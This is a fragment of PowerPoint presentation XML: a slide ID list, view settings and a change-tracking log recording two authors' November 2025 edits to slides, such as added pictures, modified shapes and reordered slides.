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4"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId6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300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316" r:id="rId25"/>
    <p:sldId id="317" r:id="rId26"/>
    <p:sldId id="318" r:id="rId27"/>
    <p:sldId id="319" r:id="rId28"/>
    <p:sldId id="320" r:id="rId29"/>
    <p:sldId id="321" r:id="rId30"/>
    <p:sldId id="277" r:id="rId31"/>
    <p:sldId id="278" r:id="rId32"/>
    <p:sldId id="279" r:id="rId33"/>
    <p:sldId id="280" r:id="rId34"/>
    <p:sldId id="281" r:id="rId35"/>
    <p:sldId id="283" r:id="rId36"/>
    <p:sldId id="301" r:id="rId37"/>
    <p:sldId id="287" r:id="rId38"/>
    <p:sldId id="284" r:id="rId39"/>
    <p:sldId id="286" r:id="rId40"/>
    <p:sldId id="322" r:id="rId41"/>
    <p:sldId id="289" r:id="rId42"/>
    <p:sldId id="290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10" r:id="rId51"/>
    <p:sldId id="311" r:id="rId52"/>
    <p:sldId id="309" r:id="rId53"/>
    <p:sldId id="312" r:id="rId54"/>
    <p:sldId id="314" r:id="rId55"/>
    <p:sldId id="313" r:id="rId56"/>
    <p:sldId id="315" r:id="rId57"/>
    <p:sldId id="323" r:id="rId58"/>
    <p:sldId id="324" r:id="rId59"/>
    <p:sldId id="325" r:id="rId6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FF5"/>
    <a:srgbClr val="D63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DE4840-2CA3-41B5-B857-994DAFD3743D}" v="35" dt="2025-11-25T14:41:30.4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84685" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="125" d="100"/>
          <a:sy n="125" d="100"/>
        </p:scale>
        <p:origin x="13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6/11/relationships/changesInfo" Target="changesInfos/changesInfo1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k Hrkút" userId="69b41f3f-cce6-4833-b1b6-94a378442888" providerId="ADAL" clId="{7B99D3AF-880F-4221-A809-06FF0B99387A}"/>
    <pc:docChg chg="modSld">
      <pc:chgData name="Patrik Hrkút" userId="69b41f3f-cce6-4833-b1b6-94a378442888" providerId="ADAL" clId="{7B99D3AF-880F-4221-A809-06FF0B99387A}" dt="2025-11-24T19:58:48.589" v="1" actId="6549"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Patrik Hrkút" userId="69b41f3f-cce6-4833-b1b6-94a378442888" providerId="ADAL" clId="{7B99D3AF-880F-4221-A809-06FF0B99387A}" dt="2025-11-24T19:58:48.589" v="1" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="274"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Patrik Hrkút" userId="69b41f3f-cce6-4833-b1b6-94a378442888" providerId="ADAL" clId="{7B99D3AF-880F-4221-A809-06FF0B99387A}" dt="2025-11-24T19:58:48.589" v="1" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="274"/>
            <ac:spMk id="233" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}"/>
    <pc:docChg chg="undo custSel addSld modSld sldOrd">
      <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:42:36.544" v="1055" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T12:02:54.330" v="3" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="256"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T12:02:54.330" v="3" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="256"/>
            <ac:spMk id="3" creationId="{F38D8C27-ED93-24FF-DC62-0865F13B005B}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:33:59.834" v="10" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="259"/>
        </pc:sldMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:33:37.751" v="4"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="259"/>
            <ac:picMk id="3" creationId="{08A8610C-DE78-43FA-449D-2CC00CD6A28E}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:33:41.582" v="5"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="259"/>
            <ac:picMk id="5" creationId="{9A8C91E7-8AA4-BC6D-CCF6-59D33A2AAFC9}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:33:59.834" v="10" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="259"/>
            <ac:picMk id="7" creationId="{F5B2092F-B7AD-3A28-F088-475A22B61E8E}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:36:07.393" v="20" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="262"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:35:44.257" v="14" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="262"/>
            <ac:spMk id="149" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:36:07.393" v="20" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="262"/>
            <ac:picMk id="3" creationId="{0BDB991D-B01D-917F-C216-F3476CADEAD8}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:38:32.724" v="27" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="264"/>
        </pc:sldMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:38:32.724" v="27" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="264"/>
            <ac:picMk id="4" creationId="{2ABCA38E-DBC0-E027-9FFF-B004D8F3B7E9}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:45:53.077" v="29" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="267"/>
        </pc:sldMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:45:53.077" v="29" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="267"/>
            <ac:picMk id="3" creationId="{5B598F39-99FF-16D4-C308-1AC8587E4E76}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:46:40.919" v="31" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="268"/>
        </pc:sldMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:46:40.919" v="31" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="268"/>
            <ac:picMk id="4" creationId="{AA7E71F6-B77B-043D-C3B0-C882B4E56073}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:01:05.640" v="54" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="270"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:01:05.640" v="54" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="270"/>
            <ac:spMk id="206" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:55:48.466" v="33" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="270"/>
            <ac:picMk id="3" creationId="{F1646BDF-14E4-07D6-BBEC-E2EF39AF7FEE}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:57:25.895" v="40" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="271"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:57:25.895" v="40" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="271"/>
            <ac:spMk id="213" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:58:09.881" v="41" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="272"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T13:58:09.881" v="41" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="272"/>
            <ac:spMk id="220" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:14:47.977" v="70" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="280"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:14:42.024" v="67" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="280"/>
            <ac:spMk id="276" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:14:47.977" v="70" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="280"/>
            <ac:picMk id="3" creationId="{AC8DBD9D-0F89-55FE-C969-992A0F0712F4}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:10:28.978" v="61"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1374904057" sldId="309"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:10:28.978" v="61"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2896734754" sldId="312"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:10:28.978" v="61"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2395426689" sldId="313"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:10:28.978" v="61"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4115519205" sldId="314"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:10:28.978" v="61"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2849008532" sldId="315"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:06:24.183" v="59" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2214316431" sldId="316"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:06:24.183" v="59" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2214316431" sldId="316"/>
            <ac:spMk id="2" creationId="{C4D10226-5C2C-8CAB-CD4A-1BD10FABE277}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:06:12.147" v="57" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2214316431" sldId="316"/>
            <ac:spMk id="3" creationId="{23E7D142-8AFB-AC2C-072B-D35D52843C52}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:23:37.738" v="131" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1462864535" sldId="317"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:23:13.943" v="121" actId="313"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1462864535" sldId="317"/>
            <ac:spMk id="2" creationId="{5AA754F6-2FD3-A420-3CFA-BB50C84ECED9}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:23:37.738" v="131" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1462864535" sldId="317"/>
            <ac:spMk id="3" creationId="{4266A55A-7DF1-B955-36C1-D53D6FFF350E}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:23:23.349" v="123"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1462864535" sldId="317"/>
            <ac:spMk id="5" creationId="{55DB22E6-2758-5B28-8497-16B44487D464}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:15.907" v="145" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2855272931" sldId="318"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:23:47.110" v="133"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2855272931" sldId="318"/>
            <ac:spMk id="2" creationId="{44F18AFD-412E-FDE4-C102-CC1D5B7DF157}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:15.907" v="145" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2855272931" sldId="318"/>
            <ac:spMk id="3" creationId="{9182BC12-A64C-AC01-637D-2ABE699F266F}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:59.192" v="160" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="422719289" sldId="319"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:30.648" v="147"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="422719289" sldId="319"/>
            <ac:spMk id="2" creationId="{74B866AB-106A-5E0F-DFE6-B1F22504EB65}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:41.315" v="149" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="422719289" sldId="319"/>
            <ac:spMk id="3" creationId="{4FE09DB9-A5FD-46C5-3F44-EDF89AC6E176}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:54.393" v="157" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="422719289" sldId="319"/>
            <ac:spMk id="6" creationId="{D68C912E-0D51-4FC7-E1F7-4A0142B16525}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:24:59.192" v="160" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="422719289" sldId="319"/>
            <ac:spMk id="8" creationId="{2606DD30-3F92-4030-48A2-A971E1C5D564}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:28:06.580" v="371" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1976457692" sldId="320"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:25:21.121" v="181" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1976457692" sldId="320"/>
            <ac:spMk id="2" creationId="{F9591FBE-72A8-DCFB-DE32-66B3BBBCB09F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:28:06.580" v="371" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1976457692" sldId="320"/>
            <ac:spMk id="3" creationId="{443DAF22-4A0E-759A-D4F1-998D5AE14E16}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:32:26.189" v="392" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3310049549" sldId="321"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:29:38.281" v="382" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3310049549" sldId="321"/>
            <ac:spMk id="2" creationId="{0D214BE1-3F62-79E5-83EF-C79B54603821}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:31:54.799" v="386" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3310049549" sldId="321"/>
            <ac:spMk id="3" creationId="{8814BE7F-ACE3-02E3-A801-4E505D140851}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:31:53.145" v="385" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3310049549" sldId="321"/>
            <ac:spMk id="6" creationId="{E6D5116E-BCE5-C2C4-5DBF-4FF2805EB161}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:32:26.189" v="392" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3310049549" sldId="321"/>
            <ac:picMk id="8" creationId="{1A9B99E4-2A6C-29FF-C105-836512C16698}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:35:00.101" v="407" actId="1076"/>
